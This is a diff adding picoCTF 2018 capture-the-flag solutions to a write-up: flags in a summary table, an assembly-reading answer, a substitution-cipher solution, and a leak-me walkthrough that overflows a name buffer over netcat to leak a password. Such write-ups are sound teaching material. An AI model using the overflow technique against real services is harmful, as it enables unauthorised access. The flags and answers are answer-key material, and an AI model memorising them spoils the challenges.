@@ -36,7 +36,7 @@ Logon                        Web              150     picoCTF{l0g1ns_ar3nt_r34l_
 Reading between the eyes     Forensics        150
 Recovering from the snap     Forensics        150     picoCTF{th3_5n4p_happ3n3d}
 admin panel                  Forensics        150     picoCTF{n0ts3cur3_894a6546}
-assembly-0                   Reversing        150
+assembly-0                   Reversing        150     0x7a
 buffer overflow 0            Binary Exploit   150     picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}
 caesar cipher 1              Cryptography     150     picoCTF{justagoodoldcaesarcipherwoyolfpu}
 environ                      General Skills   150     picoCTF{eNv1r0nM3nT_v4r14Bl3_fL4g_3758492}
@@ -51,7 +51,8 @@ Truly an Artist              Forensics        200
 be-quick-or-be-dead-1        Reversing        200
 blaise's cipher              Cryptography     200     picoCTF{v1gn3r3_c1ph3rs_ar3n7_bad_cdf08bf0}
 buffer overflow 1            Binary Exploit   200     picoCTF{addr3ss3s_ar3_3asy56a7b196}
-leak-me                      Binary Exploit   200
+hertz 2                      Cryptography     200     picoCTF{substitution_ciphers_are_too_easy_sgsgtnpibo}
+leak-me                      Binary Exploit   200     picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}
 now you don't                Forensics        200     picoCTF{n0w_y0u_533_m3}
 shellcode                    Binary Exploit   200
 what base is this?           General Skills   200
@@ -978,9 +979,29 @@ located in the directory at `/problems/assembly-0_1_fc43dbf0079fd5aab87236bf3bf4
 
 **Solution**
 
-**Flag**
+```asm
+.intel_syntax noprefix
+.bits 32
+
+.global asm0
+
+asm0:
+	push	ebp
+	mov	ebp,esp
+	mov	eax,DWORD PTR [ebp+0x8]
+	mov	ebx,DWORD PTR [ebp+0xc]
+	mov	eax,ebx
+	mov	esp,ebp
+	pop	ebp
+	ret
 ```
 
+we can deduce the output manually. `ret` will return the value of `eax`, which was set to the value of `ebx` (`mov eax ebx`), and ebx was set do the second argument we passed to the program (`mov	ebx,DWORD PTR [ebp+0xc]`), which in this case was `0x7a`
+
+
+**Flag**
+```
+0x7a
 ```
 
 ## Binary Exploitation 150: buffer overflow 0
@@ -1554,6 +1575,34 @@ It works!!!
 picoCTF{addr3ss3s_ar3_3asy56a7b196}Segmentation fault
 ```
 
+## Cryptography 200: hertz 2
+
+**Challenge**
+
+This flag has been encrypted with some kind of cipher, can you decrypt it? Connect with `nc 2018shell1.picoctf.com 12521`.
+
+**Solution**
+
+When we connect we are given a ciphertext
+
+```
+Yln mvsfi ugbxe abj tvkow bcng yln qrzd pbh. S fre'y unqsncn ylsw sw wvfl re nrwd ogbuqnk se Osfb. Sy'w rqkbwy rw sa S wbqcnp r ogbuqnk rqgnrpd! Bird, asen. Lngn'w yln aqrh: osfbFYA{wvuwysyvysbe_fsolngw_rgn_ybb_nrwd_whwhyeosub}
+```
+
+we input this to https://quipqiup.com/ and it decodes to
+
+```
+The quick brown fox jumps over the lazy dog. I can't believe this is such an easy problem in Pico. It's almost as if I solved a problem already! Okay, fine. Here's the flag: picoCTF{substitution_ciphers_are_too_easy_sgsgtnpibo}
+```
+
+
+**Flag**
+```
+picoCTF{substitution_ciphers_are_too_easy_sgsgtnpibo}
+```
+
+
+
 ## Binary Exploitation 200: leak-me
 
 **Challenge**
@@ -1637,11 +1686,38 @@ int main(int argc, char **argv){
 
 ```
 
+If we overflow the buffer for the `name` variable, we can get the flag
+
+```
+nc 2018shell1.picoctf.com 31045
+What is your name?
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a_reAllY_s3cuRe_p4s$word_d98e8d
+
+Incorrect Password!
+```
+
+so it output the password for this, we connect again and use the password to get our flag:
+
+```
+$ nc 2018shell1.picoctf.com 31045
+What is your name?
+bla
+Hello bla,
+Please Enter the Password.
+a_reAllY_s3cuRe_p4s$word_d98e8d
+picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}
+```
+
+
+
 **Solution**
 
 **Flag**
 ```
-
+picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}
 ```
 
 
